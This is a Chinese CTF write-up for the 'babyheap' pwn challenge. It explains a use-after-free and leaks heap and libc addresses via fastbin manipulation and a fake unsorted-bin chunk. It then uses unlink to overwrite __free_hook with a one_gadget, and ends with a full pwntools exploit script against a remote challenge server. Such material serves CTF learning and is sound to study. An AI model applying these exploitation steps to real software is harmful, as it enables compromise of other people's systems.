@@ -1,0 +1,190 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="b2ec1af87246ee2e14ee9319aeaaf309">前言</h2>
+<p>我看社区已经有人在发Writeup了，但是也不是特别全。其中 Pwn 部分少了个babyheap的题解。我在这里稍微补充下。</p>
+<h3 data-content="1" id="139f9e9c5233677588092c6fb578ef4e"> </h3>
+<h3 data-content="1" id="c7368797692ab85a3ac2f2e7e7300c04">0x01 分析</h3>
+<p>题目四个功能，分别是new，change，show和delete。漏洞很明显在于delete函数。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180822231930-c4075b84-a61e-1.png"/></p>
+<p>在这个函数中，存在指针未置零的情况，可以造成UAF 。</p>
+<p>其次有几个注意的点 块只能新建9块，以及新建块的大小为 0x20 ，不可控。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180822231930-c4177456-a61e-1.png"/></p>
+<p>编辑一个块最多只能三次。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180822231930-c425e090-a61e-1.png"/></p>
+<h3 data-content="1" id="ecd9658b4d6a4c4db51fdffb232e03f9"> </h3>
+<h3 data-content="1" id="0f736087046dd35935b32d45fff2d018">0x02 利用思路</h3>
+<div class="highlight"><pre><span></span>root@8593c2d5ac83:/home/wd/babyheap/babyheap# checksec babyheap
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">'/home/wd/babyheap/babyheap/babyheap'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</pre></div>
+<p>由于块的大小是 0x20 ，可以想到是经典的fastbins attack + uaf。</p>
+<h4 data-content="1" id="0135d697dbac1f1fb54ef1270e63c237">第一步：思考 如何泄露出 libc 地址</h4>
+<p>由于我们需要最终需要知道 libc base 来构造最后的getshell payload。那么第一个思路是通过fake 一个chunk，让它分配到 unsortedbin 中，我们知道当一个chunk 在 unsortedbin中的时候，它的fd会指向 main_arena</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180822231930-c434db90-a61e-1.png"/></p>
+<p>由于 UAF 漏洞的存在，我们这个时候去 show 这个chunk 的时候程序会将他 fd的内容打印出来。这个时候就能泄露出 libc地址。</p>
+<p>但是要fake 一个chunk我们需要heap的地址。所以我们首先去 泄露  heap 地址。</p>
+<h4 data-content="1" id="d6ca880f73494bccecdf6eafaa77956b">第二步 泄露 heap 地址。</h4>
+<p>由于fastbins 的特性，我们连续 free 两个chunk，这个时候会产生一个 fastbins 的freelist。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180822231930-c4411d24-a61e-1.png"/></p>
+<p>这个时候 0x603000 的chunk 的fd 指向 0x603030 ，我们只需要 show 一下 0x603000这个chunk，就能得到heap地址：0x603030。<strong>注意，puts 存在截断，如果你是 0x603030  --&gt; 0x603000</strong> 会存在 leak 不出来的问题。所以注意 free 的顺序。</p>
+<div class="highlight"><pre><span></span><span class="n">Delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">Delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="c1">#leak heap addr</span>
+<span class="n">Show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span> <span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x30</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'heap_addr:{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">)))</span>
+</pre></div>
+<h4 data-content="1" id="449527ab774be75c248fa5bbaf06f4ff">第三步 泄露libc 地址</h4>
+<p>要 fake 个chunk 然后让它 free 之后被放到 unsortedbin ，我们可以考虑 fastbins attack + overlap 。</p>
+<p>我们通过编辑 chunk 0 的 fd 让他指向 原本 fd-0x20的位置。当我们把 chunk 0 和 chunk 1 重新申请回来后。（fastbins的特性：后释放的，先被使用）</p>
+<div class="highlight"><pre><span></span><span class="n">Edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
+
+<span class="n">Add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+</pre></div>
+<p>并修改 size 和fd等等。由于，chunk 6的fd被修改了，所以我们去修改 chunk 7的时候，其实就是在修改我们正常chunk的size。</p>
+<div class="highlight"><pre><span></span>0x603020:       0x0000000000000000      0x0000000000000031       &lt;-- fake chunk
+0x603030:       0x0000000000000000      0x00000000000000a1       &lt;--- fake chunk size
+0x603040:       0x0000000000000000      0x0000000000000000
+0x603050:       0x0000000000000000      0x0000000000000000
+0x603060:       0x0000000000000000      0x0000000000000031
+0x603070:       0x4343434343434343      0x0000000000000000
+0x603080:       0x0000000000000000      0x0000000000000000
+0x603090:       0x0000000000000000      0x0000000000000031
+0x6030a0:       0x4444444444444444      0x0000000000000000
+0x6030b0:       0x0000000000000000      0x0000000000000000
+</pre></div>
+<p>伪造后的 chunk 由于我们设置了 size 变大了，所以默认会把后面的 chunk 给吞并。我们 在设置基本块的时候要注意这个问题。</p>
+<p>这个时候系统会认为 0x603020 这个伪造的 chunk 是存在的。所以当我们去 delete chunk 1。（由于chunk 1是后释放，所以申请到的chunk 7 指向的其实是同一个块）。系统会把 0x603020 放到unsortedbin中。（unsortedbin 不是fastbins 且不与 top chunk 紧邻，free后会被放置到unsortedbin中）</p>
+<p>紧接着，我们只需要把这个 chunk free 了。<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180822231930-c434db90-a61e-1.png"/></p>
+<p>然后show，就能获得 libc base。</p>
+<div class="highlight"><pre><span></span><span class="n">Edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
+
+<span class="n">Add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+
+
+<span class="c1"># leak libc</span>
+<span class="n">Delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">Show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span> <span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c4b78</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'libc_addr:{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_address</span><span class="p">)))</span>
+</pre></div>
+<h4 data-content="1" id="f7adaa933a31a2fdcd405424c7d88e2b">第四步 通过unlink + uaf  来获得一个任意地址写</h4>
+<p>我们现在已经有了基本的信息。思路是修改 freehook 成one_gadget 。然后进行一次free就能getshell。</p>
+<p>要达到这种效果，我们需要一个任意地址写。</p>
+<p>我们之前 free chunk 1 来获得一个libc 地址，这个时候如果顺便同过 unlink 来获得一个 任意地址写不上刚好么。所以</p>
+<div class="highlight"><pre><span></span><span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">'AAAAAAAA</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'BBBBBBBB</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">'CCCCCCCC</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s1">'DDDDDDDD</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+
+
+<span class="n">Add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602080</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602080</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+</pre></div>
+<p>chunk 2 chunk 3 是用来修改 chunk1 size 让 chunk 1 来吞并的。当 free chunk 1的时候，我们构造好 unlink 的前提（现代 unlink 有检查。）fake 的 fd  == 0x602080-0x18 刚好是 ptr[] 数组中，chunk 1 的位置。也是之后 new chunk 4 的位置。</p>
+<p>当通过unlink 后我们得到一个 chunk 指向了 chunk1 同时 chunk 4 也指向了 chunk1。 这个时候如果我们队chunk 1这块内存 写入 free_hook 的地址，然后再通过uaf 修改这个地址所指的值，写成一个 one_gadget 就能getshell。</p>
+<div class="highlight"><pre><span></span><span class="n">Edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_address</span> <span class="o">+</span> <span class="mh">0x3c67a8</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_address</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+
+
+<span class="n">Delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+<p>效果如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180822231931-c481e386-a61e-1.png"/></p>
+<h3 data-content="1" id="173cd135608bd3f79f609cdda8646b03">0x03 完整 exp</h3>
+<div class="highlight"><pre><span></span><span class="c1">#coding:utf-8</span>
+
+
+<span class="kn">from</span> <span class="nn">mypwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span> <span class="o">=</span> <span class="n">init_pwn</span><span class="p">(</span><span class="s1">'./babyheap'</span><span class="p">,</span><span class="s1">'./libc.so.6'</span><span class="p">,</span><span class="n">remote_detail</span> <span class="o">=</span> <span class="p">(</span><span class="s1">'106.75.67.115'</span><span class="p">,</span><span class="mi">9999</span><span class="p">),</span><span class="n">is_env</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="n">breakpoint</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400D59</span><span class="p">,</span><span class="mh">0x400D65</span><span class="p">,</span><span class="mh">0x0400D7D</span><span class="p">,</span><span class="mh">0x400D71</span><span class="p">]</span>
+<span class="n">malloc_hook</span> <span class="o">=</span> <span class="mh">0x3C4B10</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x4526A</span>
+
+<span class="k">def</span> <span class="nf">Add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Choice:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'1'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Index:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Content:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Choice:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'2'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Index:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Content:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Choice:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'3'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Index:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">Delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Choice:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'4'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Index:'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+
+
+<span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">'AAAAAAAA</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'BBBBBBBB</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">'CCCCCCCC</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s1">'DDDDDDDD</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+
+
+<span class="n">Add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602080</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602080</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+
+
+
+<span class="n">Delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">Delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1">#leak heap addr</span>
+<span class="n">Show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span> <span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x30</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'heap_addr:{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">)))</span>
+
+<span class="c1"># # leak libc</span>
+<span class="c1"># init_debug(p,breakpoint)</span>
+<span class="c1"># raw_input('wait to debug')</span>
+<span class="n">Edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span>
+
+<span class="n">Add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+
+
+<span class="c1"># leak libc</span>
+<span class="n">Delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">Show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span> <span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c4b78</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'libc_addr:{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_address</span><span class="p">)))</span>
+
+
+
+
+<span class="n">init_debug</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">breakpoint</span><span class="p">)</span>
+<span class="nb">raw_input</span><span class="p">(</span><span class="s1">'wait to debug'</span><span class="p">)</span>
+<span class="n">Edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_address</span> <span class="o">+</span> <span class="mh">0x3c67a8</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">Edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_address</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+
+
+<span class="n">Delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
